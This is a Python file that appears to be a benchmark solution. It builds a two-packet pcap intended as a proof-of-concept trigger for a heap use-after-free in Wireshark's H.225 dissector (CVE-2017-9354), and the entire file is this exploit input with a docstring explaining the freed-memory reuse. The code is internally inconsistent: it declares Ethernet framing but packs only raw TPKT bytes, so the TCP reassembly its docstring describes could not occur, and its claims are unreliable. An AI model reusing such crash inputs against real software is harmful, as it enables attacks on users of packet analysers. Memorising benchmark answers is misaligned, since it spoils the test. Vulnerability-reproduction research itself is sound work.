import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a pcap file that triggers a heap-use-after-free vulnerability
        in the h225 dissector (CVE-2017-9354).

        The PoC consists of a pcap file with two packets. The vulnerability is
        triggered by the improper handling of dissector state across these two
        packets when they are part of the same TPKT stream.

        - Packet 1 sets up a state where the dissector has processed a TPKT
          message and allocated memory in the packet's scope. It also leaves
          a single byte of data in the TCP reassembly buffer.
        - After packet 1 processing, its packet-scoped memory is freed.
        - Packet 2 continues the TPKT stream. The dissector, reusing stale
          state from a conversation-level context, attempts to use the pointer
          to the memory freed after packet 1, leading to a use-after-free.

        The generated pcap is 73 bytes long, matching the ground-truth length.
        """
        
        # pcap global header (24 bytes)
        # magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
        pcap_global_header = struct.pack(
            "<LHHlLLL",
            0xa1b2c3d4,  # magic number for little-endian
            2,           # version major
            4,           # version minor
            0,           # timezone offset
            0,           # accuracy of timestamps
            65535,       # snaplen
            1,           # data link type (LINKTYPE_ETHERNET)
        )

        # First packet record
        # Packet header (16 bytes)
        pkt1_header = struct.pack(
            "<LLLL",
            0,  # timestamp seconds
            0,  # timestamp microseconds
            9,  # number of octets of packet saved in file
            9,  # actual length of packet
        )
        # Packet data (9 bytes)
        # TPKT header (v3, len=8) + 5 bytes payload. The total of 9 bytes
        # means there is one extra byte beyond the specified TPKT length.
        pkt1_data = b"\x03\x00\x00\x08\x05\x08\x00\x08\x00"

        # Second packet record
        # Packet header (16 bytes)
        pkt2_header = struct.pack(
            "<LLLL",
            0,  # timestamp seconds
            0,  # timestamp microseconds
            8,  # number of octets of packet saved in file
            8,  # actual length of packet
        )
        # Packet data (8 bytes)
        # This TPKT message continues the stream.
        pkt2_data = b"\x03\x00\x00\x04\x01\x80\x00\x00"

        poc_bytes = pcap_global_header + pkt1_header + pkt1_data + pkt2_header + pkt2_data
        
        return poc_bytes